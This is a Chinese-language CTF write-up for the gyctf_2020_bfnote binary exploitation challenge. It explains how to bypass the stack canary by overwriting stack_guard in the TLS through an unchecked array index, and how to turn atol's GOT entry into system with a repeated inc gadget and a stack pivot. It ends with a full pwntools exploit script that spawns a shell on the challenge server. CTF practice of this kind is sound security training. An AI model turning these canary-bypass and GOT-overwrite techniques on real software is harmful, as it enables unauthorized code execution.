---
title: gyctf_2020_bfnote
tags:
  - 篡改TLS中stack_guard
  - 绕过canary
  - 篡改got表
  - 栈迁移
  - magic gadget
categories: buu刷题
abbrlink: 2d29ef23
---

## 总结

通过本题的学习与总结有:

1. 本题与starctf2018_babystack这题一样，考察的都是篡改TLS中的stack_guard从而绕过canary的检查，因为在2.23和2.27 32位的glibc里面主线程的TLS是位于mmap映射出来的内存，并且位置固定并不随机。而本题可以通过数组索引无限制，而在mmap映射出来的区域精准的修改某个内存，这就给了篡改TLS中的stack_guard的机会
2. 本题的难点在于之后绕过canary，无法正常的泄露libc地址，从而造成了一定难度，通过学习网上各位师傅的wp，发现本题一共有三种做法，分别是利用magic gadget篡改got表，ret2dl以及攻击IO_FILE。这里我采用的是利用magic gadget篡改got表



## 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281654944.png" alt="image-20221128165410736" style="zoom:50%;" />

## 漏洞所在

![image-20221128165734005](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281657108.png)

## 利用思路

我们现在拥有栈溢出控制执行流的机会，以及利用索引无限制任意地址写的机会。

先说如何劫持TLS里的stack_guard来绕过canary

1. 先利用malloc申请一个超大内存，观察一下mmap映射出来的地址和TLS中stack_guard的距离
2. 在最后的数组索引无限制的read里去篡改stack_guard保持其和栈里覆盖掉的canary一样即可

如图

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281712774.png" alt="image-20221128171243112" style="zoom:50%;" />

考虑到在数组里索引又被加了0x10，所以最后实际的偏移应该为0x5170c-0x10，这样即可篡改stack_guard(如下)

![image-20221128171415975](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281714096.png)

由于本题的保护是parital relro，可以篡改got表。并且libc地址的后三位是固定不变的，其实我们可以打一个rop去read往atol的got表里读入数据(atol和system的真实地址只有后五位不一样)如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281718462.png" alt="image-20221128171802376" style="zoom:50%;" />

所以我们可以直接去read读入数据控制atol的后两位为system的地址，此时也仅仅有三位不一样了，到这里爆破一下的话也有1/4096的概率(如果实在没办法的话，爆破一下也不是不行)。

但是我们去观察一下可用的gadget发现了这个inc指令(如下)

> inc b相当于add b,1，速度比add指令更快

![image-20221128172035296](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281720294.png)

同时看了一下关于ebp的gadget发现能够控制ebp(如下)

![image-20221128172221197](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281722465.png)

这就意味着我们能利用那段magic gadget来让指定的内存加1，因为紧跟ret的存在，所以能够不断执行这段gadget，而atol和system除去末尾的三位固定外，前面的部分虽然随机但是却存在固定的偏移，我们可以控制ebp-0x17fa8b40为atol函数的第三字节的地址，不断的执行inc指令，最终加到和system一样的值。

篡改成功后让执行流迁移到0x08048656这个地址，read读入/bin/sh调用atol的时候获取shell。

## EXP

```py
from tools import *
context.log_level='debug'
p,e,libc=load("b","node4.buuoj.cn:26281")
debug(p,0x0804882A,0x08048907,0x080487BA,0x8048973)
leave_ret=0x08048578
inc_ebp=0x08048434
payload=b"a"*0x32+p32(0xdeadbeef)+p32(0)+p32(0x0804A060+4)+p32(0)
p.sendlineafter("\nGive your description : ",payload)
payload=p32(0x080489db)+p32(0x804a02d+0x17fa8b40)+p32(inc_ebp)*0xd9#0xdb
payload+=p32(e.plt['read'])+p32(0x08048656)+p32(0)+p32(e.got['atol'])+p32(0x100)+p32(0x08048656)
p.sendlineafter("Give your postscript : ",payload)
p.sendlineafter("\nGive your notebook size : ",str(0x50000))
p.sendlineafter("Give your title size : ",str(0x5170c-0x10))
p.sendlineafter("invalid ! please re-enter :\n",str(0x18))
p.sendlineafter("\nGive your title : ",'c'*0x10)
p.sendlineafter("Give your note : ",p32(0xdeadbeef))#canary

sleep(0.2)
p.send("\x40")
sleep(0.2)
p.send("/bin/sh\x00")
p.interactive()
```

![image-20221128174103440](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281741828.png)



## 参考文章

[i春秋公益赛之BFnote - countfatcode - 博客园 (cnblogs.com)](https://www.cnblogs.com/countfatcode/p/12425168.html)